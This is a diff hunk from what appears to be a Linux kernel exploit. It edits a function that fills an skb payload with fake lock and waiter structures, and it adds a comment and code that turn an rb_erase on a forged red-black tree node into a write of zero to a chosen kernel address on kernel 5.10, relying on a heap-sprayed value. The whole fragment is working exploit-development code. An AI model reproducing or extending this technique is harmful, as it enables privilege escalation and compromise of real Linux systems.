@@ -355,8 +355,15 @@ int prepare_skb_payload(uintptr_t base) {
     put64(p, LOCK_OFF + 0x10, fake_w0);
     put64(p, LOCK_OFF + 0x18, fake_task | 1);
 
-    put64(p, W0_OFF + 0x00, 1);
-    put64(p, W0_OFF + 0x08, 0);
+    put64(p, W0_OFF + 0x00, 1);   /* tree_pc = 1 (RB_BLACK root) */
+    /* 5.10 write primitive: rb_erase on consumer waiter C (RED leaf,
+     * right child of W) fires __rb_change_child(W, NULL, parent_of_C)
+     * which writes W->rb_right = C->rb_right (NULL from memset).
+     * Pointing W->rb_right at the target makes the erase write 0 to
+     * pselect_custom_target.  This field is at +0x08, outside the
+     * pselect copy window (NFDS=64 covers only +0x10/+0x18/+0x20),
+     * so the heap-sprayed value survives core_sys_select. */
+    put64(p, W0_OFF + 0x08, pselect_custom_target);
     put64(p, W0_OFF + 0x10, 0);
     put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
     put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
